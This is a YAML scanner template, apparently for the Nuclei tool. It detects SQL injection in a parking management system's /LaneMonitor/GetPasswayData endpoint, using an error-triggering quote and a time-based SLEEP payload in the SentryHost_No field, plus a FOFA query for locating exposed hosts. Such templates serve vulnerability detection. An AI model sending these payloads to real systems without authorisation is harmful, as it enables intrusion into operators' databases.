id: poc-yaml-cxyun-getpasswaydata-sqli
info:
  name: Parking Management System GetPasswayData SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    fofa-query: icon_hash="938984120"

variables:
  t1: "{{rand_int(5, 10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        POST /LaneMonitor/GetPasswayData HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        SentryHost_No=1'
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "your SQL syntax"
          - "\"success\":false"
      - type: status
        status:
          - 200

  - raw:
      - |
        POST /LaneMonitor/GetPasswayData HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        SentryHost_No=1';SELECT+SLEEP({{t1}})#
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "\"msg\":\"读取成功\""
          - "\"success\":true"
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
      - type: status
        status:
          - 200
